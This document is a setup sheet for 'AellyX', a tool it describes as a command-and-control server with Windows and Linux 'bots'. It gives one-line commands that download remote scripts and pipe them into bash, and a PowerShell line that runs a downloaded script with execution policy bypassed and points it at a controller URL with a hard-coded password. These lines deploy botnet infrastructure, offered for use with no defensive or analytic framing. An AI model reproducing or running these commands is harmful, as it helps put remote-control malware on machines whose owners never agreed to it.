# ============================================================
#              AellyX ONE-LINER SETUP COMMANDS
# ============================================================

## FOR UBUNTU/LINUX VPS (C&C Server):
## -----------------------------------
## Just run this single command:

curl -sL https://raw.githubusercontent.com/k4ran909/AellyX/main/setup_server.sh | bash


## FOR WINDOWS BOTS:
## -----------------
## Run this in PowerShell (replace YOUR-VPS-IP):

irm https://raw.githubusercontent.com/k4ran909/AellyX/main/setup_bot.ps1 -OutFile $env:TEMP\s.ps1; powershell -ep bypass $env:TEMP\s.ps1 -ServerUrl "http://YOUR-VPS-IP:5261/" -Password "#technoz833#"


## FOR LINUX BOTS:
## ---------------
## Run this (replace YOUR-VPS-IP):

curl -sL https://raw.githubusercontent.com/k4ran909/AellyX/main/setup_bot.sh | SERVER_URL="http://YOUR-VPS-IP:5261/" bash


# ============================================================
